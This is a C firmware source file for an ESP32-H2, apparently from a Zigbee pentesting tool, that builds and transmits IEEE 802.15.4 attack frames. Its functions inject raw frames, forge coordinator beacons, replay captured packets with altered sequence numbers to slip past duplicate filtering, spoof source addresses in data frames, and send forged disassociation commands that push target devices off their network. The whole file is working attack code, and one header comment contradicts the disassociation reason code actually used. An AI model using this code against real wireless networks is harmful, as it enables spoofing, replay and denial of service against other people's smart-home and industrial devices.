/**
 * @file zigbee_injector.c
 * @brief IEEE 802.15.4 / Zigbee frame injection engine.
 *
 * Constructs and transmits valid 802.15.4 frames for pentesting:
 * raw injection, forged beacons, replay attacks, data frame spoofing,
 * and disassociation attacks.
 */

#include "zigbee_injector.h"
#include "ieee802154_hal.h"
#include "frame_parser.h"

#include <string.h>
#include "esp_log.h"

static const char *TAG = "zigbee_injector";

/* ── State ────────────────────────────────────────────────────────── */

static bool     s_initialized = false;
static uint8_t  s_seq_num     = 0;       /**< Auto-incrementing sequence number */
static uint32_t s_tx_count    = 0;

/* ── Helpers ──────────────────────────────────────────────────────── */

/** Write uint16 little-endian into buffer, return bytes written. */
static inline uint8_t wr16(uint8_t *buf, uint16_t val)
{
    buf[0] = (uint8_t)(val & 0xFF);
    buf[1] = (uint8_t)((val >> 8) & 0xFF);
    return 2;
}

/**
 * Build a transmit buffer from an MPDU.
 *
 * The ESP32-H2 802.15.4 driver expects:
 *   tx_buf[0] = PHY length (MPDU length + 2 for FCS appended by HW)
 *   tx_buf[1..] = MPDU
 *
 * Returns total buffer length (1 + mpdu_len).
 */
static uint8_t build_tx_buf(uint8_t *tx_buf, const uint8_t *mpdu, uint8_t mpdu_len)
{
    tx_buf[0] = mpdu_len + 2; /* +2 for FCS */
    memcpy(&tx_buf[1], mpdu, mpdu_len);
    return 1 + mpdu_len;
}

/* ── Public API ───────────────────────────────────────────────────── */

esp_err_t zigbee_injector_init(void)
{
    if (s_initialized) return ESP_OK;

    s_seq_num    = 0;
    s_tx_count   = 0;
    s_initialized = true;

    ESP_LOGI(TAG, "Injector initialized");
    return ESP_OK;
}

esp_err_t zigbee_inject_raw(uint8_t *frame, uint8_t len)
{
    if (!s_initialized) return ESP_ERR_INVALID_STATE;
    if (frame == NULL || len == 0 || len > 125) return ESP_ERR_INVALID_ARG;

    uint8_t tx_buf[128];
    uint8_t tx_len = build_tx_buf(tx_buf, frame, len);

    esp_err_t err = zigblade_radio_transmit(tx_buf, tx_len);
    if (err == ESP_OK) {
        s_tx_count++;
        ESP_LOGD(TAG, "Raw frame injected (%d bytes)", len);
    }
    return err;
}

esp_err_t zigbee_inject_beacon(uint16_t panid, uint8_t channel)
{
    if (!s_initialized) return ESP_ERR_INVALID_STATE;
    if (channel < ZIGBLADE_CHANNEL_MIN || channel > ZIGBLADE_CHANNEL_MAX) {
        return ESP_ERR_INVALID_ARG;
    }

    /* Save current channel and switch */
    uint8_t prev_channel = zigblade_radio_get_channel();
    zigblade_radio_set_channel(channel);

    /*
     * Construct IEEE 802.15.4 beacon frame:
     *
     * FCF (2 bytes):
     *   Frame Type = 0 (Beacon)
     *   Security Enabled = 0
     *   Frame Pending = 0
     *   ACK Request = 0
     *   PAN ID Compression = 0
     *   Dest Addr Mode = 0 (None)
     *   Frame Version = 0
     *   Source Addr Mode = 2 (Short)
     *   = 0x8000
     *
     * Seq Num (1)
     * Source PAN ID (2)
     * Source Address (2) = 0x0000 (coordinator)
     *
     * Superframe Spec (2):
     *   Beacon Order = 15 (non-beacon)
     *   Superframe Order = 15
     *   Final CAP Slot = 15
     *   PAN Coordinator = 1
     *   Association Permit = 1
     *   = 0xCFFF
     *
     * GTS Spec (1) = 0x00
     * Pending Address Spec (1) = 0x00
     *
     * Zigbee Beacon Payload (15 bytes):
     *   Protocol ID (1) = 0x00
     *   Stack Profile / nwkProtocolVersion (1) = 0x22 (profile 2, version 2)
     *   Router Capacity / Device Depth (1) = 0x14
     *   End Device Capacity / Extended PAN (1) = 0x01
     *   Extended PAN ID (8) = all zeros
     *   TX Offset (3) = 0xFFFFFF (no TX offset)
     *   Update ID (1) = 0x00
     */

    uint8_t mpdu[40];
    uint8_t pos = 0;

    /* FCF: Beacon, Src Addr Mode = Short */
    uint16_t fcf = IEEE802154_FRAME_TYPE_BEACON  /* bits 0-2: frame type */
                 | (0x02 << 14);                 /* bits 14-15: src addr mode */
    pos += wr16(&mpdu[pos], fcf);

    /* Sequence number */
    mpdu[pos++] = s_seq_num++;

    /* Source PAN ID */
    pos += wr16(&mpdu[pos], panid);

    /* Source short address (coordinator = 0x0000) */
    pos += wr16(&mpdu[pos], 0x0000);

    /* --- Beacon payload --- */

    /* Superframe specification: non-beacon, association permit */
    uint16_t super = 0x0FFF  /* BO=15, SO=15, FinalCAP=15 */
                   | (1 << 14)  /* PAN coordinator */
                   | (1 << 15); /* Association permit */
    pos += wr16(&mpdu[pos], super);

    /* GTS specification: no GTS */
    mpdu[pos++] = 0x00;

    /* Pending address specification: none pending */
    mpdu[pos++] = 0x00;

    /* Zigbee beacon payload */
    mpdu[pos++] = 0x00;  /* Protocol ID = Zigbee */
    mpdu[pos++] = 0x22;  /* Stack profile 2, NWK protocol version 2 */
    mpdu[pos++] = 0x14;  /* Router capacity=1, device depth=2 */
    mpdu[pos++] = 0x01;  /* End device capacity=1 */

    /* Extended PAN ID (8 bytes, matching PAN ID for simplicity) */
    memset(&mpdu[pos], 0, 8);
    mpdu[pos]     = (uint8_t)(panid & 0xFF);
    mpdu[pos + 1] = (uint8_t)((panid >> 8) & 0xFF);
    pos += 8;

    /* TX offset (3 bytes, 0xFFFFFF = not available) */
    mpdu[pos++] = 0xFF;
    mpdu[pos++] = 0xFF;
    mpdu[pos++] = 0xFF;

    /* Update ID */
    mpdu[pos++] = 0x00;

    /* Transmit */
    uint8_t tx_buf[64];
    uint8_t tx_len = build_tx_buf(tx_buf, mpdu, pos);
    esp_err_t err = zigblade_radio_transmit(tx_buf, tx_len);

    /* Restore previous channel */
    zigblade_radio_set_channel(prev_channel);

    if (err == ESP_OK) {
        s_tx_count++;
        ESP_LOGI(TAG, "Beacon injected: PAN=0x%04X ch=%d", panid, channel);
    }
    return err;
}

esp_err_t zigbee_inject_replay(const captured_packet_t *pkt)
{
    if (!s_initialized) return ESP_ERR_INVALID_STATE;
    if (pkt == NULL) return ESP_ERR_INVALID_ARG;

    /* Use the raw frame from the captured packet */
    uint8_t raw_len = pkt->parsed.raw_len;
    if (raw_len == 0 || raw_len > 125) return ESP_ERR_INVALID_SIZE;

    /* Copy and optionally increment sequence number to avoid
       being filtered as a duplicate by the target */
    uint8_t mpdu[128];
    memcpy(mpdu, pkt->parsed.raw, raw_len);

    /* Sequence number is at byte 2 for standard frames */
    if (raw_len >= 3) {
        mpdu[2] = s_seq_num++;
    }

    /* Switch to the original capture channel */
    zigblade_radio_set_channel(pkt->channel);

    uint8_t tx_buf[130];
    uint8_t tx_len = build_tx_buf(tx_buf, mpdu, raw_len);
    esp_err_t err = zigblade_radio_transmit(tx_buf, tx_len);

    if (err == ESP_OK) {
        s_tx_count++;
        ESP_LOGI(TAG, "Replay injected (%d bytes, ch=%d)", raw_len, pkt->channel);
    }
    return err;
}

esp_err_t zigbee_inject_data(uint16_t dst_short,
                             uint16_t src_short,
                             uint16_t panid,
                             const uint8_t *payload,
                             uint8_t len)
{
    if (!s_initialized) return ESP_ERR_INVALID_STATE;
    if (payload == NULL || len == 0) return ESP_ERR_INVALID_ARG;

    /*
     * IEEE 802.15.4 Data frame with intra-PAN addressing:
     *
     * FCF (2):
     *   Frame Type = 1 (Data)
     *   PAN ID Compression = 1
     *   Dest Addr Mode = 2 (Short)
     *   Src Addr Mode = 2 (Short)
     *   = 0x8861
     *
     * Seq Num (1)
     * Dst PAN ID (2)
     * Dst Short Addr (2)
     * Src Short Addr (2) — no src PAN due to compression
     * Payload (variable)
     */

    uint8_t mpdu[128];
    uint8_t pos = 0;

    /* Maximum payload: 125 - 9 (header) = 116 bytes */
    if (len > 116) return ESP_ERR_INVALID_SIZE;

    /* FCF: Data frame, PAN ID compress, short/short addressing */
    uint16_t fcf = IEEE802154_FRAME_TYPE_DATA
                 | (1 << 6)      /* PAN ID compression */
                 | (0x02 << 10)  /* Dst addr mode: short */
                 | (0x02 << 14); /* Src addr mode: short */
    pos += wr16(&mpdu[pos], fcf);

    /* Sequence number */
    mpdu[pos++] = s_seq_num++;

    /* Destination PAN ID (only one PAN ID due to compression) */
    pos += wr16(&mpdu[pos], panid);

    /* Destination short address */
    pos += wr16(&mpdu[pos], dst_short);

    /* Source short address (spoofed) */
    pos += wr16(&mpdu[pos], src_short);

    /* Payload */
    memcpy(&mpdu[pos], payload, len);
    pos += len;

    uint8_t tx_buf[130];
    uint8_t tx_len = build_tx_buf(tx_buf, mpdu, pos);
    esp_err_t err = zigblade_radio_transmit(tx_buf, tx_len);

    if (err == ESP_OK) {
        s_tx_count++;
        ESP_LOGI(TAG, "Data injected: 0x%04X -> 0x%04X (%d bytes payload)",
                 src_short, dst_short, len);
    }
    return err;
}

esp_err_t zigbee_inject_disassoc(uint16_t target_short,
                                 uint16_t panid,
                                 uint16_t coord_short)
{
    if (!s_initialized) return ESP_ERR_INVALID_STATE;

    /*
     * IEEE 802.15.4 MAC Command frame — Disassociation Notification
     *
     * FCF (2):
     *   Frame Type = 3 (MAC Command)
     *   ACK Request = 1
     *   PAN ID Compression = 1
     *   Dest Addr Mode = 2 (Short)
     *   Src Addr Mode = 2 (Short)
     *   = 0x8863
     *
     * Seq Num (1)
     * Dst PAN ID (2)
     * Dst Short Addr (2) = target
     * Src Short Addr (2) = coordinator (spoofed)
     *
     * Command ID (1) = 0x03 (Disassociation Notification)
     * Disassociation Reason (1) = 0x02 (Coordinator wishes device to leave)
     */

    uint8_t mpdu[16];
    uint8_t pos = 0;

    /* FCF: MAC command, ack request, PAN compress, short/short */
    uint16_t fcf = IEEE802154_FRAME_TYPE_CMD
                 | (1 << 5)      /* ACK request */
                 | (1 << 6)      /* PAN ID compression */
                 | (0x02 << 10)  /* Dst addr mode: short */
                 | (0x02 << 14); /* Src addr mode: short */
    pos += wr16(&mpdu[pos], fcf);

    /* Sequence number */
    mpdu[pos++] = s_seq_num++;

    /* Destination PAN ID */
    pos += wr16(&mpdu[pos], panid);

    /* Destination address (target to disassociate) */
    pos += wr16(&mpdu[pos], target_short);

    /* Source address (spoofed as coordinator) */
    pos += wr16(&mpdu[pos], coord_short);

    /* MAC Command: Disassociation Notification */
    mpdu[pos++] = 0x03;  /* Command ID */

    /* Disassociation reason:
       0x01 = "The coordinator wishes the device to leave the PAN"
       0x02 = "The device wishes to leave the PAN"
       Use 0x01 since we're spoofing as the coordinator. */
    mpdu[pos++] = 0x01;

    uint8_t tx_buf[32];
    uint8_t tx_len = build_tx_buf(tx_buf, mpdu, pos);
    esp_err_t err = zigblade_radio_transmit(tx_buf, tx_len);

    if (err == ESP_OK) {
        s_tx_count++;
        ESP_LOGW(TAG, "Disassoc injected: target=0x%04X PAN=0x%04X "
                 "(spoofed src=0x%04X)", target_short, panid, coord_short);
    }
    return err;
}

uint32_t zigbee_injector_get_tx_count(void)
{
    return s_tx_count;
}
